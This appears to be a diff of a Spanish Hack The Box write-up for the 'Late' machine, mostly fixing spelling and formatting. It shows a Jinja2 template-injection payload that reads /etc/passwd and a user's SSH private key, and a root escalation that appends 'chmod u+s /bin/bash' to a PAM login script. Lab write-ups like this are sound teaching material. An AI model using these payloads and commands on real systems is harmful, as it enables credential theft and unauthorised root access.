@@ -64,7 +64,7 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Hay dos puertos abiertos, el 22 (SSH) y el 80 (HTTP). De momento no contamos con credenciales para iniciar sesión por SSH así que proseguimos a enumerar el sitio web, inicialmente usando la herramienta _whatweb_:
+Hay dos puertos abiertos, el 22 (SSH) y el 80 (HTTP). De momento no contamos con credenciales para iniciar sesión por SSH así que proseguimos a enumerar el sitio web, inicialmente usando la herramienta `whatweb`:
 ```shell
 ❯ whatweb http://10.10.11.156
 http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[\#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]
@@ -73,19 +73,19 @@ http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[\#,s
 La versión de _JQuery_ es antigua, podríamos intentar el ataque de _prototype pollution_. De momento, vamos a visualizar la página en el navegador:
 ![Web Late](/assets/favicon/2022-07-30/late1.png)
 
-_Home_, _Contact_ y _MORE INFO_, nos llevan a la misma página, no tenemos nada para jugar (campos de entrada) sin embargo, más abajo en la misma página podemos ver un subdominio:
+_Home_, _Contact_ y _MORE INFO_, nos llevan a la misma página, no tenemos nada para jugar (campos de entrada); sin embargo, más abajo en la misma página podemos ver un subdominio:
 ![Web subdomain Late](/assets/favicon/2022-07-30/late2.png)
 
-__late free online photo editor__ nos lleva a _images.late.htb_, procedemos a agregar el subdominio al _/etc/hosts_ para que el navegador sepa resolver. Vemos que nos redirige a una página en la cual podemos subir una imágen para leer el texto de la imágen y guardarlo en un archivo, además muestra que está empleando flask:
+__late free online photo editor__ nos lleva a `images.late.htb`, procedemos a agregar el subdominio al `/etc/hosts` para que el navegador sepa resolver. Vemos que nos redirige a una página en la cual podemos subir una imagen para leer el texto de la imagen y guardarlo en un archivo. Además, muestra que está empleando `flask`:
 ![Subdomain images.late.htb](/assets/favicon/2022-07-30/late3.png)
 
 {% assign ssti = "{{7*7}}" %}
 ## Explotando la vulnerabilidad SSTI
-¿Qué vulnerabilidad podríamos intentar en este caso? Por supuesto, podríamos intentar la vulnerabilidad SSTI. Intentemos subir una imágen de prueba con {{ ssti }} (Hay otros test que se pueden usar para comprobar si es vulnerable):
+¿Qué vulnerabilidad podríamos intentar en este caso? Por supuesto, podríamos intentar la vulnerabilidad SSTI. Intentemos subir una imagen de prueba con {{ ssti }} (Hay otros test que se pueden usar para comprobar si es vulnerable):
 
 ![Test SSTI](/assets/favicon/2022-07-30/test_ssti.png)
 
-Al subir la imágen y escánearla nos descarga un archivo _results.txt_ en el que aparece el texto de la imágen, pero en este caso ha sido interpretado el código. Abrimos el archivo y aparece `<p>49</p>`, de esta forma queda testeado que es vulnerable. 
+Al subir la imagen y escanearla, nos descarga un archivo llamado `results.txt` en el que aparece el texto de la imagen, pero en este caso ha sido interpretado el código. Abrimos el archivo y aparece `<p>49</p>`, de esta forma queda testeado que es vulnerable. 
 
 Probemos un payload de [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2). En mi caso usaré el siguiente para ver los usuarios del sistema:
 
@@ -93,15 +93,15 @@ Probemos un payload de [AllTheThings](https://github.com/swisskyrepo/PayloadsAll
 ```shell
 {{ ssti }}
 ```
-(Recordemos tomarle una captura de pantalla para subirlo, además puede que no salga a la primera porque podría no leer bien las letras, en ese caso es bueno probar ampliando el rango en que se toma la foto).
+(Recordemos tomarle una captura de pantalla para subirlo. Además, puede que no salga a la primera porque podría no leer bien las letras, en ese caso es bueno probar ampliando el rango en que se toma la foto).
 
-La respuesta del servidor es nuevamente el archivo _results.txt_, en este caso vemos el archivo _/etc/passwd_ y hay dos usuarios que tienen shell, el usuario _svc\_acc_ y _root_. Sabiendo lo anterior, ahora podemos leer la _id\_rsa_ del usuario svc\_acc para intentar conectarnos por SSH, por lo que nuevamente usaré el payload anterior, cambiando la ruta y hacer un pantallazo de:
+La respuesta del servidor es nuevamente el archivo `results.txt`. En este caso vemos el archivo `/etc/passwd` y hay dos usuarios que tienen shell: el usuario `svc_acc` y `root`. Sabiendo lo anterior, ahora podemos leer la `id_rsa` del usuario `svc_acc` para intentar conectarnos por SSH; por lo que, nuevamente usaré el payload anterior, cambiando la ruta y hacer un pantallazo de:
 {% assign ssti = '{{ get_flashed_messages.__globals__.__builtins__.open("/home/scv_acc/.ssh/id_rsa").read() }}' %}
 ```shell
 {{ ssti }}
 ```
 
-...para subirlo y obtener la clave privada. Ahora movemos el archivo con la clave privada a nuestro directorio de trabajo y le quitamos las etiquetas `<p></p>` , además le damos permiso _600_ (rw-------):
+...para subirlo y obtener la clave privada. Ahora movemos el archivo con la clave privada a nuestro directorio de trabajo y le quitamos las etiquetas `<p></p>` , además le damos permisos `600`:
 ```shell
 ❯ mv ~/Downloads/results.txt id_rsa; 
 ❯ sed -i 's/<p>//' id_rsa
@@ -156,7 +156,7 @@ Y en la máquina víctima:
 ```
 
 ### Analizando posible vector
-Ahora podemos usar linpeas o pspy para ver si hay algo de lo que nos podamos aprovechar para escalar privilegios. Ejecutando _lipeas_ en la máquina víctima nos aparece este archivo que podemos modificar, además tiene extensión _.sh_:
+Ahora podemos usar `linpeas` o `pspy` para ver si hay algo de lo que nos podamos aprovechar para escalar privilegios. Ejecutando `linpeas` en la máquina víctima, nos aparece este archivo que podemos modificar, además tiene la extensión `.sh`:
 ```shell
 ╔══════════╣ .sh files in path
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
@@ -182,7 +182,7 @@ if [ ${PAM_TYPE} = "open_session" ]; then
     echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
 fi
 ```
-Si ejecutamos pspy (también en la máquina víctima) vemos que el archivo en el que podemos "escribir", constantemente el usuario _root_ lo esta copiando y nos asigna como propietarios del mismo:
+Si ejecutamos `pspy` (también en la máquina víctima) vemos que el archivo en el que podemos "escribir". Constantemente el usuario `root` lo esta copiando y nos asigna como propietarios del mismo:
 ```shell
 CMD: UID=0    PID=29874  | /bin/bash /root/scripts/cron.sh 
 CMD: UID=0    PID=29873  | /bin/sh -c /root/scripts/cron.sh 
@@ -195,15 +195,15 @@ CMD: UID=0    PID=29883  | /usr/sbin/CRON -f
 CMD: UID=0    PID=29890  | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh
 ```
 
-Analizando el script, entendemos que envía un correo con ciertas especifícaciones cuando iniciamos sesión por SSH gracias al control de _PAM_ (por lo que nos podría sacar a patadas si ve algo inusual en los inicios de sesión...) 
+Analizando el script, entendemos que envía un correo con ciertas especifícaciones cuando iniciamos sesión por SSH gracias al control `PAM` (nos podría sacar a patadas si ven algo inusual en los inicios de sesión...) 
 
-Ahora ¿Cómo sabemos que el script se está ejecutando? Bueno, podemos revisar algunos archivos de configuración (.bashrc, .profile, _/etc_) o buscar el texto `/usr/local/sbin/ssh-alert.sh` de forma recursiva con grep para saber desde dónde se está ejecutando, de la siguiente forma:
+Ahora ¿Cómo sabemos que el script se está ejecutando? Bueno, podemos revisar algunos archivos de configuración (`.bashrc`, `.profile`, `/etc`) o buscar el texto `/usr/local/sbin/ssh-alert.sh` de forma recursiva con grep para saber desde dónde se está ejecutando, de la siguiente forma:
 ```shell
 ❯ svc_acc@late:~$ grep -r '/usr/local/sib/ssh-alert.sh' / 2>/dev/null
 session required pam_exec.so /usr/local/sbin/ssh-alert.sh
 ```
 
-Podemos ver que está en el archivo '/etc/pam.d/sshd', por lo que ya podemos darnos a la idea de que se está ejecutando cada vez que iniciamos sesión por SSH.
+Podemos ver que está en el archivo `/etc/pam.d/sshd`; por lo que, ya podemos darnos a la idea de que se está ejecutando cada vez que iniciamos sesión por SSH.
 
 Ahora veamos los permisos de `ssh-alert.sh`:
 ```shell
@@ -217,13 +217,13 @@ drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
 -----a--------e--- ssh-alert.sh
 ```
 
-Aparentemente tenemos permisos de escritura `-rwxr-xr-x`, sin embargo listando los atributos del archivo, podemos ver que tiene la letra _a_, esto quiere decir que no podemos modificar nada de lo que tiene un archivo, aún así, al script se le puede agregar nueva información. Si quisieramos convertirnos en root podríamos hacer lo siguiente:
+Aparentemente tenemos permisos de escritura `-rwxr-xr-x`, sin embargo listando los atributos del archivo, podemos ver que tiene la letra `a`, esto quiere decir que no podemos modificar nada de lo que tiene un archivo. Aún así, al script se le puede agregar nueva información. Si quisieramos convertirnos en root podríamos hacer lo siguiente:
 ```shell
 svc_acc@late:/usr/local/sbin$ echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh
 ```
 
-Escribirmos en el archivo (ssh-alert) que queremos darle permisos SUID al binario _/bin/bash_
-Salimos de la sesión, y volvemos a iniciar con el mismo usuario:
+Escribimos en el archivo (`ssh-alert`) que queremos darle permisos `SUID` al binario `/bin/bash`
+Salimos de la sesión y volvemos a iniciar con el mismo usuario:
 ```shell
 ❯ svc_acc@late:/usr/local/sbin$ exit
 Connection to 10.10.11.156 closed
@@ -235,7 +235,7 @@ Connection to 10.10.11.156 closed
 root
 ```
 
-Cuando iniciamos sesión el código es interpretado, asigna el permiso dado a _/bin/bash_
-Ejecutamos _/bin/bash_ con permisos privilegiados (-p) y somos root :D.  
+Cuando iniciamos sesión, el código es interpretado, asigna el permiso dado a `/bin/bash`
+Ejecutamos `/bin/bash` con permisos privilegiados (`-p`) y somos root :D.  
 
 ¡Happy Hacking!
